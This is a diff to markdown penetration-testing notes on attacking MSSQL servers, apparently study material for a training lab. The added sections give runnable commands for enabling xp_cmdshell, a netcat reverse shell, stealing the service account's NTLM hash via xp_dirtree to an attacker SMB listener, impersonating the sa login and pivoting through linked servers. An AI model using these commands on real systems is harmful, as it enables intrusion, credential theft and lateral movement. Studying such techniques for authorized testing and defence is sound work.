@@ -57,7 +57,7 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > run
 If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
 
 ```bash
-python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth  
+python3 mssqlclient.py Administrator@$ip -windows-auth  
 # With python3 mssqlclient.py help you can see more options.
 ```
 
@@ -85,13 +85,17 @@ SELECT name FROM master..syslogins
 # And to make sure: 
 SELECT is_srvrolemember(‘sysadmin’); 
 # If your user is admin, it will return 1.
+
+# Read Local Files in MSSQL
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 ```
 
-## Executing cmd shell in a SQL command line
+## Attacks
+### Executing cmd shell in a SQL command line
 
 Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command **xp_cmdshell**, that will allow us to use the SQL command line as a CLI. 
 
-Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default. But we can use sp_configure or Policy Based Management to enable it. 
+Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
 
 **sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:
 
@@ -108,6 +112,8 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 # To update the currently configured value for this feature.  
 RECONFIGURE;  
 ```
+
+>Note:  The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
 
 Now we can use the msSQL terminal to execute commands:
 
@@ -126,6 +132,106 @@ xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 
 # You could also upload winPEAS and run it from this powershell command line
 ```
 
+There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).
+
+### Capture MSSQL Service Hash
+
+We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
+
+When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
+
+**1.** First, start [Responder](responder.md) or [smbserver from impacket](smbserver.md).
+
+**2.** Run:
+
+```cmd-session
+# For XP_DIRTREE Hash Stealing
+EXEC master..xp_dirtree '\\$ip\share\'
+
+# For XP_SUBDIRS Hash Stealing
+EXEC master..xp_subdirs '\\$ip\share\
+
+
+```
+
+If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
+
+**3.** XP_SUBDIRS Hash Stealing with Responder
+
+```shell-session
+sudo responder -I tun0
+```
+
+**4.** XP_SUBDIRS Hash Stealing with impacket
+
+```shell-session
+sudo impacket-smbserver share ./ -smb2support
+```
+
+### Impersonate Existing Users with MSSQL
+
+SQL Server has a special permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends:
+
+Impersonating sysadmin
+
+```cmd-session
+# Identify Users that We Can Impersonate
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+
+# Verify if our current user has the sysadmin role:
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+#  value 0 indicates no sysadmin role, value 1 is sysadmin role
+
+```
+
+Impersonating sa user
+
+```cmd-session
+USE master;
+EXECUTE AS LOGIN = 'sa';
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
+> It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.
+
+To revert the operation and return to our previous user
+
+```cmd-session
+REVERT;
+```
+
+
+### Communicate with Other Databases with MSSQL
+
+`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
+
+If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. 
+
+```
+# Identify linked Servers in MSSQL
+SELECT srvname, isremote FROM sysservers;
+```
+
+```cmd-session
+
+srvname                             isremote
+----------------------------------- --------
+DESKTOP-MFERMN4\SQLEXPRESS          1
+10.0.0.12\SQLEXPRESS                0
+
+
+# isremote, where 1 means is a remote server, and 0 is a linked server. 
+```
+
+```cmd-session
+#  Identify the user used for the connection and its privileges:
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS];
+# The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
+```
+
+>  If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
 
 ## Sources and resources
 
